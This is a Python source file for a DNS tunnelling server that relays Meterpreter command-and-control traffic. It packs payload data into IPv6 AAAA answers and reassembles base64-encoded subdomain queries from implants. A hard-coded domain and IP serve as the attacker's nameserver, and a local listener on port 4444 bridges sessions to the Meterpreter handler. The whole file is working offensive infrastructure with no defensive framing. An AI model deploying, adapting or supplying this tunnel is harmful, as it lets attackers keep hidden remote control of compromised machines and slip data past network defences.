#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import SocketServer
import struct
import re
import ssl
import Queue
import copy
import base64

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass



class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


        
class DNSTunnelResponse():
    @staticmethod
    def inc(pointer):
        lst = [ord(x) for x in list(pointer)]
        
        lst[-1] += 1
        
        if lst[-1] > 122:
            lst[-1] = 97
            
            lst[-2] += 1
            if lst[-2] > 122:
                lst[-2] = 97
                lst[-3] += 1
                if lst[-3] > 122:
                    lst[-3] = 97
                    lst[-4] += 1
                    if lst[-4] > 122:
                        lst[-4] = 97
    
        return ''.join([chr(x) for x in lst])
        
    def __init__(self, data, TLV_REQX, start = 'aaaa'):
        
        self.ansx = TLV_REQX  # Block of IPv6 addresses
        max_size = 14 * 16
        cur_seq = start
        cur_seq1 = DNSTunnelResponse.inc(cur_seq)
        
        # next domain name
        ip_seq = "fe81:" + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) +  '00:'
        
        cntx = 0
        t_size = len(data) # TLV size
        
        if t_size <= max_size:
            ip_seq += "00" # Last block
        else:
            ip_seq += "01" # More blocks will be added
            
        # overall size    
        hex_sz = (hex(t_size)[2:]).zfill(8)
        ip_seq += hex_sz[6:8] + ":" + hex_sz[4:6] + hex_sz[2:4] + ":" + hex_sz[0:2] + "00"
        
        # DNS Header added
        self.ansx[cur_seq] = []
        self.ansx[cur_seq].append(ip_seq)
        cntx += 1
        
        # Now we are going to encode data
        
        #how many IP blocks we need
        iter_big = t_size / max_size 
        if (t_size % max_size):
            iter_big += 1
            
        curr_point = 0

        for_pack = data[curr_point:max_size]
        x_size = len(for_pack)
        
        while True:
            pcs = x_size / 14
            pcs_ = x_size % 14
            
            output = list(for_pack)
            
            i = 0
            while i < pcs:
                part = []
                y = 0
                while y < 14:
                    part.append(
                      ''.join([hex(ord(x))[2:].zfill(2) for x in output[(i * 14) + y:(i * 14) + y +2]])
                    )
                    y += 2
                    
                outputX = 'ff' + hex(i)[2:].zfill(1) + 'e:' + ':'.join(part)
                self.ansx[cur_seq].append(outputX)
                cntx += 1
            
                i +=1 
            
            # Rest data 
            
            if pcs_ != 0:
                part = []
                if pcs_ % 2 != 0:
                    output2 = output[pcs * 14:(pcs * 14) + pcs_ ]
                    y = 0
                    while y < pcs_:
                        part.append(
                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
                        )
                        y += 2
                        
                    part[-1] += '00'
                    
                else:
                    output2 = output[pcs * 14:(pcs * 14)+ pcs_ + 1]
                    y = 0
                    while y < pcs_:
                        part.append(
                          ''.join([hex(ord(x))[2:].zfill(2) for x in output2[y: y +2]])
                        )
                        y += 2
                print part
                end_t = ':0000' * (7 - len(part))
                outputX = 'ff' + hex(i)[2:].zfill(1) + hex(pcs_)[2:].zfill(1) + ':' + ':'.join(part) + end_t
                self.ansx[cur_seq].append(outputX)
                cntx += 1
            t_size -= x_size
            curr_point += x_size
                
            if t_size !=0 :
                cur_seq = DNSTunnelResponse.inc(cur_seq)
                cur_seq1 = DNSTunnelResponse.inc(cur_seq)
                    
                # Next block and header
                ip_seq = 'fe81:' + '00:'.join([hex(ord(x))[2:].zfill(2) for x in list(cur_seq1)]) + '00:'
                    
                cntx = 0
                for_pack = data[curr_point:curr_point + max_size]
                x_size = len(for_pack)
                    
                if t_size <= max_size:
                    ip_seq += "03" # Last block
                else:
                    ip_seq += "02" # More blocks will be added
                    
                ip_seq += '00:0000:0000'
                self.ansx[cur_seq] = []
                self.ansx[cur_seq].append(ip_seq)
                cntx += 1
            print i
            print t_size
            if t_size == 0:
                break
        
    def get_ipv6(self):
        return self.ansx
        
D = DomainName('0x41.ws.')
IP = '54.194.143.85'
TTL = 1


#soa_record = SOA(
#    mname=D.ns1,  # primary name server
#    rname=D.msf,  # email of the domain administrator
#    times=(
#        201307231,  # serial number
#        60 * 60 * 1,  # refresh
#        60 * 60 * 3,  # retry
#        60 * 60 * 24,  # expire
#        60 * 60 * 1,  # minimum
#    )
#)

ns_records = [NS(D.ns1), NS(D.ns2)]

#records = {
#    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
#    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
#    D.ns2: [A(IP)],
#    D.mail: [A(IP)],
#    D.andrei: [CNAME(D)],
#}

LPORT = 4444
CONNECTED = False

servers = []

TLV_REQ = {}
TLV_RES = {'rdy': False}

MAX_SIZE = 14 * 16 # Maximum size of DNS reponse (IPv6)

curr_sub_ = "aaaa"


def add_meter_request(data):
    global TLV_REQ
    global curr_sub_
    while 'y' + curr_sub_ not in TLV_REQ:
        time.sleep(0.1)
    print("NEW REQUEST: GOGO! " + curr_sub_)   
    print " ".join([ hex(ord(ch))[2:] for ch in data ])
    TLV_REQ = DNSTunnelResponse(data, TLV_REQ, curr_sub_).get_ipv6() 
    del TLV_REQ['y' + curr_sub_]
    
    return True
    
def get_meter_response(wait=600):
    global TLV_RES
    zero = 0
    print "WAITING FOR RESPONSE"
    while not bool(TLV_RES['rdy']) and zero < (wait * 10):
        time.sleep(0.1)
        zero += 1
    if 'full_in' in TLV_RES:
        print "GOT RESPONSE"
        data = TLV_RES['full_in']
    else:
        print "NO RESPONSE"
        data = None
    TLV_RES = {'rdy': False}
    return data

def xor_bytes(key, data):
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
    
def dns_response(data):
   
    try:
        request = DNSRecord.parse(data)
        return dns_response_(request)
    except Exception as e:
        print "Parse error"
        return None
        
        
def dns_response_(request):
    global CONNECTED
    global LPORT
    global TLV_REQ
    global TLV_RES
    global curr_sub_       
    print("\n\nINCOMING: ")

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    #if qn == D or qn.endswith('.' + D):
    #
    #    for name, rrs in records.items():
    #        if name == qn:
    #            for rdata in rrs:
    #                rqt = rdata.__class__.__name__
    #                if qt in ['*', rqt]:
    #                    reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
    #
    #    for rdata in ns_records:
    #        reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
    # 
    #    reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    if qn.endswith('.' + D) and qtype==QTYPE.AAAA:
        print ("Connected status:" + str(CONNECTED))
        if not CONNECTED:
            servers.append(ThreadedTCPServer(('', LPORT),MeterBaseRequestHandler))
            thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
            thread.daemon = True  # exit the server thread when the main thread terminates
            thread.start()
            print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))
            CONNECTED = True
        print("IN REQ: " + qn)
        
        m = re.match(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
        mc = re.match(r"(?P<sub_dom>\w{4})\.c\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
        if m:
            mx = m
        elif mc :
            mx = mc
        else:
            mx = None
            
        if mx and 'y' + mx.group('sub_dom') in TLV_REQ:
            print "Return WAITING for " + mx.group('sub_dom')
            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))

            
        elif mx and mx.group('sub_dom') in TLV_REQ:
            print("Return DATA for" + mx.group('sub_dom'))
            for ip in TLV_REQ[mx.group('sub_dom')]:
                print "\t" + ip
                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(ip)))  
        elif mx and  mx.group('sub_dom') not in TLV_REQ:
            #TLV_REQ = {}
            curr_sub_ = mx.group('sub_dom')
            TLV_REQ['y' + curr_sub_] = True
            print("Return WAITING (create) for " + mx.group('sub_dom'))
            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000"))) 
            if mc:
                TLV_RES['rdy'] = True
        else:
            m1 = re.match(r"(?P<base64>.*)\.(?P<padd>\d+)\.(?P<idx>\d+)\.(?P<client>\w)\." + D, qn)
            if m1 and 'recieved_in' in TLV_RES:
                print("INDATA: DATA CAME")
                base_in = m1.group('base64')
                index_in = int(m1.group('idx'))
                
                padding = "" + ("=" * int(m1.group('padd')))
                
                base_in = re.sub(r"\.", "", base_in)
                base_in = re.sub(r"\-", "+", base_in)
                base_in = re.sub(r"\_", "/", base_in)
                
                lnx = len(base_in)
                
                print "\nsize: " + str(TLV_RES['size_in']) + " index: " + str(index_in) + " length " + str(lnx) + " base64: " + base_in + " padd:" +  str(padding) +"\n";
                
                if TLV_RES['size_in'] > 0:
                    
                    print "\n old: " + str(TLV_RES['index_last']) + " vs " + str(index_in) + "\n"
                    
                    if (index_in <=  TLV_RES['index_last'] and TLV_RES['index_last'] - index_in < 64535):
                        print "\ndbl\n"
                     
                    else:
                    
                        TLV_RES['base64'] += base_in
                        TLV_RES['size_in']  -=  lnx
                        TLV_RES['index_last'] =  index_in
                         
                        print "\nRCecieved " + str(index_in) + ":" + base_in;
                        
                    if (TLV_RES['size_in']  == 0):
                        print "RECIEVED FULL PACKET\n";
                        try:
                            TLV_RES['full_in'] = base64.b64decode(TLV_RES['base64'] + padding);
                            print TLV_RES['full_in']
                        except Exception  as e:
                            print TLV_RES['base64']
                            print " ---> "
                            print "Server ERROR " + str(e)
                            TLV_RES['full_in']=""
                        TLV_RES['rdy'] = True
                        print("INDATA: OK, more")
                    
                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:f000:0000:0000")))

                else:
                    print("INDATA: FINISH")
                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))
            elif m1:
                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))    
            else:
                m2 = re.match(r"(?P<size>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
                if m2:
                    print("INDATA: HEADER CAME")
                    TLV_RES['size_in'] = int(m2.group('size'))
                    TLV_RES['recieved_in'] = 0
                    TLV_RES['index_last'] = -1
                    TLV_RES['base64'] =  ""
                    
                    print("Ready to get " + str(TLV_RES['size_in']))
                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:0000:0000:0000")))
                else:
                    print("Bad Request 1")


    elif qn.endswith(D) and qtype==QTYPE.NS:
        for rdata in ns_records:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
    elif qn.endswith(D) and qtype==QTYPE.A:
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
    #print("---- Reply:\n", reply)
    #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s DNS request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1]))
        try:
            data = self.get_data()
            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            dns_ans = dns_response(data)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            traceback.print_exc(file=sys.stderr)

class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(256)
        return data

    def send_data(self, data):
        return self.request.sendall(data)

    def handle(self):
        buflen = 25600
        
        s = ssl.wrap_socket(self.request,
          #keyfile = "server.key",
          ca_certs = "server.crt",
          cert_reqs = ssl.CERT_NONE,
          server_side=False)
         # server_side=True,
          #ssl_version=ssl.PROTOCOL_SSLv23)
        s.setblocking(False)
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s TCP request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0], self.client_address[1]))
        try:
            data = s.recv(buflen)
        except ssl.SSLError as e:
            data = None
        print "Read on empty client socket: {}".format(data)

        s.write("GET /123456789 HTTP/1.0\r\n\r\n")
        # Give client a chance to write something
        time.sleep(0.5)
        
        #Session
        while True:
            s.settimeout(0.5)
            try:
                print("WAITING FOR THE HEADER")
                data = s.recv(8) # get header
            except socket.timeout:
                print "EPTY IN"
                data = None
            except ssl.SSLError, e:
                if str(e) == "('The read operation timed out',)":
                    print "EPTY IN2"
                    data = None
                else:
                    print "Server ERROR " + str(e) + "  '" + str(e)+"'"
                    data = None
                    s = None
                    break
            except Exception  as e:
                print "Server ERROR2 " + str(e)
                data = None
                s = None
                break
            s.settimeout(None)
                
            if data is None:
                print "EMPTY"
                #time.sleep(1)
                #continue
                return_tlv = get_meter_response(1)
            else:
                print("PARSE HEADER")
                # Parse header
                xor_key = data[:4][::-1]
                header_length = xor_bytes(xor_key, data[4:8])
                pkt_length = struct.unpack('>I', header_length)[0] - 4
                # Get all data 
                print "   in len: " + str(pkt_length)
                s.settimeout(20*60)
                while pkt_length > 0 :
                    try:
                        packet = s.recv(pkt_length) # get header
                        pkt_length -= len(packet)
                        data += packet  
                        print "left: " + str(pkt_length)
                    except Exception  as e:
                        print "Server ERROR " + str(e)
                        packet = None
                        s = None
                        break
                # Ready
                s.settimeout(None)  
                print "Server said {}".format(" ".join([ hex(ord(ch))[2:] for ch in data ]))
                add_meter_request(data)
                return_tlv = get_meter_response()
                
            
            if return_tlv:
                print "Client said {}".format(" ".join([ hex(ord(ch))[2:] for ch in return_tlv ]))
                try:
                    s.write(return_tlv)
                    
                except Exception  as e:
                    print "Server ERROR 2 " + str(e)
                    data = None
                    s = None
                    break
                print "SENT"
            
            time.sleep(2)

            
class TCPRequestHandler(BaseRequestHandlerDNS):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')

    args = parser.parse_args()
    

    print("Starting nameserver...")

    
    servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
    servers.append(SocketServer.ThreadingTCPServer(('', args.dport), TCPRequestHandler))
    global LPORT
    LPORT = args.lport

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()